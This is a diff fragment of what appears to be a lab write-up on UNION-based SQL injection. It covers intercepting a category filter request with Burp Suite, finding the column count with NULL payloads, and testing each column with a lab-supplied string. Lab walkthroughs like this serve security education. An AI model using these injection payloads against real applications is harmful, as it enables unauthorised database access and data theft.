@@ -6,6 +6,7 @@ I intercepted the category filter request using *Burp Suite*.
 Then I figured out number of columns was *3* by changing payload to *'+UNION+SELECT+NULL,NULL,NULL--*.
 
 I replaced each NULL value with string 'CPuMuw' (provided by lab), testing each column.
+
 '+UNION+SELECT+'CPuMuw',NULL,NULL--  
 '+UNION+SELECT+NULL,'CPuMuw',NULL--  
 '+UNION+SELECT+NULL,NULL,'CPuMuw'--  
